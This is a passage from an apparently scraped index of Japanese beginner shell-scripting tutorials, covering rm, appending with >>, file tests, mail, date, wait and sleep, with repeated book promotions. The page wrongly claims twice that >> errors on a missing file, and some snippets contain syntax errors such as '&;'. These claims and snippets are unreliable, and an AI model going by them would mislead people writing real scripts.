フォルダを削除\nrm -rf 高度なヒント シェルスクリプトで自動化処理を作成する場合、cp や rm で、確認をせずに実行したいことが多々あります。 この場合は、 /bin/cp\nまたは\n/bin/rm を使うと、確認なしで実行することができます。\n書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-13T11:26:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-24-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-24-suzuki/","title":"【２４．ファイルを削除する】ざっくりわかる「シェルスクリプト」"},{"content":"ファイルに追加 ファイルに追加：\nbashで「\u0026raquo;」演算子を使用すると、既存のファイルに新しいデータを追加できます。\u0026lsquo;append_file.sh \u0026lsquo;という名前のファイルを作成し、次のコードを追加して、ファイルの最後に新しいコンテンツを追加します。ここで、「Learning Level 5」は、スクリプトの実行後に「book.txt」ファイルのに追加されます。\n1. Pro AngularJS 2. Learning JQuery 3. PHP Programming 4. Code Igniter #!/bin/bash echo \u0026#34;追加する前のファイル\u0026#34;; cat book.txt; echo \u0026#34;5. Bash Programming\u0026#34; \u0026gt;\u0026gt; book.txt echo \u0026#34;追加した後のファイル\u0026#34; cat book.txt; bashコマンドでファイルを実行します。\n$ bash append_file.sh 追加する前のファイル 1. Pro AngularJS 2. Learning JQuery 3. PHP Programming 4. Code Igniter 追加した後のファイル 1. Pro AngularJS 2. Learning JQuery 3. PHP Programming 4. Code Igniter 5. Bash Programming $ ヒント 「\u0026gt;」はファイルを新しく作成して追記します。 「\u0026raquo;」は既に存在するファイルに追記します。ですので、ファイルが存在しないにもかかわらず、「\u0026raquo;」を行うと、ついするファイルがないため、エラーとなります。 ファイルの存在を確認するための方法を次の章で説明します。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-13T11:26:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-25-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-25-suzuki/","title":"【２５．ファイルに追加】ざっくりわかる「シェルスクリプト」"},{"content":"ファイルが存在するかどうかを確認 ファイルが存在するかどうかをテストします。\n\u0026lsquo;-e\u0026rsquo;または\u0026rsquo;-f\u0026rsquo;オプションを使用して、ファイルの存在を確認できます。次のコードの \u0026lsquo;if [ ]\u0026lsquo;では、ファイルの存在をテストするために「-f」オプションが使用されています。\u0026rsquo; file_exist.sh \u0026lsquo;という名前のファイルを作成し、次のコードを追加します。ここで、ファイル名はコマンドラインから渡されます。\n#!/bin/bash filename=$1; if [ -f \u0026#34;$filename\u0026#34; ];then echo \u0026#34;ファイルが存在します。\u0026#34;; else echo \u0026#34;ファイルは存在しません。\u0026#34;; fi bashコマンドでファイルを実行します。\n$ ls book.txt level.txt bash file_exist.sh level2.txt ファイルは存在しません。 bash file_exist.sh level.txt ファイルが存在します。 ヒント 「\u0026raquo;」（アペンド）を行う場合の注意点は、必ずアペンドするファイルが存在している必要があるところです。 ファイルが存在していればアペンド（追記）する。 ファイルが存在しなければファイルを作成して追記する。 といった処理が必要で、この処理を行わない場合、ファイルが存在しないにもかかわらず、値をファイルに追記しようとした際にエラーとなります。サンプルを以下に示します。 #!/bin/bash if [ -f level.txt ]; then # ファイルが存在するならば追記する echo \u0026#34;Bash Programming\u0026#34; \u0026gt;\u0026gt; level.txt; else # ファイルが存在しないからlevel.txtを作成してから追記 :\u0026gt; level.txt; echo \u0026#34;Bash Programming\u0026#34; \u0026gt;\u0026gt; level.txt; fi echo \u0026#34;追加した後のファイル\u0026#34; cat level.txt; ヒント touch コマンドと :\u0026gt; の違いを明確にしておく必要があります。 「:\u0026gt;」 は、該当ファイルがなければ作成、あっても空のファイルに置き換えます。 「touch」は、該当ファイルがなければ作成しますが、あれば何もしません。 この違いを利用するとif文はとても簡潔に書き換えることができます。 touchコマンドを使って上記ソースを書き換えてみます。 #!/bin/bash :\u0026gt; level.txt # 新規にファイルを作成 echo \u0026#34;Shell Scripting\u0026#34; \u0026gt;\u0026gt; level.txt; echo \u0026#34;1回目に追加したファイル\u0026#34; cat level.txt; # 既にファイルが存在するので何もしない # 万が一、ファイルが存在しなければ作成。 touch level.txt; echo \u0026#34;Bash Programming\u0026#34; \u0026gt;\u0026gt; level.txt; echo \u0026#34;2回目に追加したファイル\u0026#34; cat level.txt; $ bash bash_append_file3.sh 1回目に追加したファイル Shell Scripting 2回目に追加したファイル Shell Scripting Bash Programming $ 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-13T11:26:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-26-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-26-suzuki/","title":"【２６．ファイルが存在するかどうかを確認】ざっくりわかる「シェルスクリプト」"},{"content":"mailコマンド メールを送る：\n\u0026rsquo; mail \u0026lsquo;または \u0026rsquo; sendmail \u0026lsquo;コマンドを使用して電子メールを送信できます。これらのコマンドを使用する前に、mailまたはsendmailに必要なパッケージをインストール・設定をする必要があります。\u0026rsquo; mail_example.sh \u0026lsquo;という名前のファイルを作成し、次のコードを追加して電子メールを送信します。\nmailコマンドインストール まずはここを参考に\nMacでコマンドからメールを送る Gmail\nlinuxの場合は\n$ yum install mailx 実際にメールを送ってみます。 $ echo \u0026#34;本文\u0026#34; | mail -s \u0026#34;タイトル\u0026#34; -r from@example.com -c cc1@example.com -c cc2@example.com to1@example.com to2@example.com 恐ろしいほどに簡単ですね。\nおかしな事をかんがえるのはやめましょう。\nシェルスクリプトでサンプルを作る admin@sample.com の部分を自分のメールアドレスに置き換えて実行して下さい。\n#!/bin/bash Recipient=\u0026#34;admin@sample.com\u0026#34; Subject=\u0026#34;Greeting” Message=\u0026#34;Welcome to our site\u0026#34; `mail -s $Subject $Recipient \u0026lt;\u0026lt;\u0026lt; $Message` bashコマンドでファイルを実行します。\n$ bash mail_example.sh $ ヒント くれぐれもおかしな事をかんがえるのはやめましょう。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-13T11:26:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-27-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-27-suzuki/","title":"【２７．mailコマンド】ざっくりわかる「シェルスクリプト」"},{"content":"dateコマンド 現在の日付を解析する：\ndateコマンドを使用して、現在のシステムの日付と時刻の値を取得することができます。日付と時刻は、「Y」、「m」、「d」、「H」、「M」、および「S」を使用します。\u0026lsquo;date_parse.sh\u0026rsquo;という名前の新しいファイルを作成し、次のコードを追加して、日、月、年、時、分、秒の値を表示します。\n#!/bin/bash Year=`date +%Y`; Month=`date +%m`; Day=`date +%d`; Hour=`date +%H`; Minute=`date +%M`; Second=`date +%S`; echo `date`; echo \u0026#34;Current Date is: $Day-$Month-$Year\u0026#34;; echo \u0026#34;Current Time is: $Hour:$Minute:$Second\u0026#34;; bashコマンドでファイルを実行します。\n$ bash date_parse.sh 2022年 1月13日 木曜日 12時19分06秒 JST Current Date is: 13-01-2022 Current Time is: 12:19:06 $ ヒント dateコマンドは覚えるのではなく、manコマンドで都度、探しましょう。きりがないです。できる事を覚えておけばオッケーです。以下にありきたりなパターンを列挙しておきます。 $ date \u0026#39;+%Y/%m/%d\u0026#39; 2005/09/11 $ date \u0026#39;+%Y/%m/%d(%a)\u0026#39; 2005/09/11(Sun) $ date \u0026#39;+%y/%m/%d\u0026#39; 05/09/11 $ date \u0026#39;+%F\u0026#39; 2005-09-11 $ date \u0026#39;+%D\u0026#39; 09/11/05 $ date \u0026#39;+%R\u0026#39; 01:18 $ date \u0026#39;+%T\u0026#39; 01:18:01 $ date \u0026#39;+%r\u0026#39; 01:18:06 AM $ date \u0026#39;+%Y/%m/%d%n%r\u0026#39; 2005/09/11 01:18:27 AM #↑%n を使用することで、出力に改行を含めることができる。 # 1日後 $ date -d \u0026#39;1 day\u0026#39; # 2日後 $ date -d \u0026#39;2 days # 1日前 $ date -d \u0026#39;1 day ago\u0026#39; # 1ヶ月前 $ date -d \u0026#39;1 month ago\u0026#39; # 1年前 $ date -d \u0026#39;1 year ago\u0026#39; # 1時間前 $ date -d \u0026#39;1 hour ago\u0026#39; # 1分前 $ date -d \u0026#39;1 minute ago\u0026#39; # 1秒前 $ date -d \u0026#39;1 second ago\u0026#39; $ IFSBK=${IFS} ; IFS=$\u0026#39;\\n\u0026#39; ; for record in $(cat /var/log/messages ) ; do if [ $(( $(date +\u0026#34;%s\u0026#34;) - 300 )) -lt $(echo ${record} | cut -d\u0026#34; \u0026#34; -f 1,2,3 | date --date=\u0026#34;$(cat -)\u0026#34; +\u0026#34;%s\u0026#34;) ] ; then echo ${record} ; fi ; done | grep error ; IFS=${IFSBK} 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-13T11:26:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-28-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-28-suzuki/","title":"【２８．dateコマンド】ざっくりわかる「シェルスクリプト」"},{"content":"waitコマンド waitコマンド：\nwaitコマンドは、実行中のプロセスの完了を待機するLinuxの組み込みコマンドです。 waitコマンドは、特定のプロセスIDまたはジョブIDで使用されます。waitコマンドでプロセスIDまたはジョブIDが指定されていない場合、現在のすべての子プロセスが完了するのを待機し、終了ステータスを返します。\u0026rsquo; wait_example.sh\u0026rsquo;という名前のファイルを作成し、次のスクリプトを追加します。\n#!/bin/bash echo \u0026#34;Wait command\u0026#34; \u0026amp; process_id=$! wait $process_id echo \u0026#34;Exited with status $?\u0026#34; bashコマンドでファイルを実行します。\n$ bash wait_example.sh Wait command Exited with status 0 $ わかりにくいですね。\nもう少しわかりやすく説明します。\nwaitコマンドは、他のプロセスの終了まで待機することができるコマンドです。\n例えば、以下三つのファイルを実行します。\n末尾に \u0026amp; がついているのは、それぞれの実行ファイルをバックグラウンドで並列で実行させることを意味しています。\n#!/bin/bash bash a.sh \u0026amp;; bash b.sh \u0026amp;; bash c.sh \u0026amp;; では、三つの実行ファイルが全て完了したらコメントを出力するソースに書き直してみます。\n#!/bin/bash bash a.sh \u0026amp;; bash b.sh \u0026amp;; bash c.sh \u0026amp;; echo \u0026#34;終了しました\u0026#34;; 上記のソースは、実行の終了を待たずに「終了しました」が出力されます。要するに、コメントの出力は全ての実行を待っていない訳です。正しいソースに書き直してみます。\n#!/bin/bash bash a.sh \u0026amp;; bash b.sh \u0026amp;; bash c.sh \u0026amp;; wait; echo \u0026#34;終了しました\u0026#34;; 上記のようにwaitコマンドを挟むことで、a.sh, b.sh, c.sh の実行が終了してから完了メッセージを表示させることが出来ました。\n前の処理終了を待ってから、次の処理を実行する方法は以下の通りです。\n#!/bin/bash command1 \u0026amp; command2 \u0026amp; wait command3 上記の様にすると、command1とcommand2が終了してからcommand3が実行される様にできます。command1と2がバックグラウンドで実行され、waitコマンドで処理終了まで待機し、command3が実行されるといった流れです。\nヒント waitコマンドと似ているsleepコマンドについて、次の章で説明します。またsleepコマンドとwaitコマンドを組み合わせて並列処理を行うサンプルも次の章で示します。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-13T11:26:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-29-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-29-suzuki/","title":"【２９．waitコマンド】ざっくりわかる「シェルスクリプト」"},{"content":"sleepコマンド sleepコマンド：\nコマンドの実行を特定の期間一時停止する場合は、sleepコマンドを使用できます。遅延量は、 秒（s）、分（m）、時間（h）、および日（d）で設定できます。\u0026lsquo;sleep_example.sh\u0026rsquo; という名前のファイルを作成し、次のスクリプトを追加します。このスクリプトは、実行後5秒間待機します。\n#!/bin/bash echo “Wait for 5 seconds” sleep 5 echo “Completed” bashコマンドでファイルを実行します。\n$ bash sleep_example.sh “Wait for 5 seconds” “Completed” $ わかりにくいですね。\n少し高度だけど、わかりやすいサンプルも書いておきます。\nwait コマンドのサンプル sleep コマンドをバックグラウンドで実行させ、前の章で使ったwait コマンドで同期をとります。。バックグランドで実行したコマンドのプロセス ID は 